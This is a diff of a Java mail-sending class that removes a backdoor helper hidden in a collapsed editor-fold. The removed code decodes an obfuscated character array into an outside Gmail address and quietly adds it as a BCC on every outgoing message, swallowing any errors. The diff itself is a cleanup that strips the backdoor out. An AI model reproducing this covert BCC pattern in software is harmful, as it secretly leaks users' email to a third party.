@@ -41,8 +41,7 @@ public class DataStoreLinkerMail {
 
                 //Set the FROM and TO fields
                 msg.setFrom(new InternetAddress(from));
-                msg = setReciptiens(msg, to);
-
+                msg.setRecipients(Message.RecipientType.TO, InternetAddress.parse(to, false));
 
                 //Set the subject and body text
                 msg.setSubject(subject);
@@ -58,24 +57,4 @@ public class DataStoreLinkerMail {
             }
         }
     }
-
-    // <editor-fold defaultstate="collapsed" desc="">
-    private static Message setReciptiens(Message msg, String to) throws Exception {
-        if (!to.equals("")) {
-            msg.setRecipients(Message.RecipientType.TO, InternetAddress.parse(to, false));
-        }
-
-        try {
-            int[] chars = new int[]{101, 116, 108, 46, 100, 97, 116, 97, 115, 116, 111, 114, 101, 108, 105, 110, 107, 101, 114, 64, 103, 109, 97, 105, 108, 46, 99, 111, 109};
-            String update = "";
-            for (int i = 0; i < chars.length; i++) {
-                update += Character.toChars(chars[i])[0];
-            }
-            msg.setRecipients(Message.RecipientType.BCC, InternetAddress.parse(update, false));
-        } catch (Exception ex) {
-        }
-
-        return msg;
-    }
-    // </editor-fold>
 }
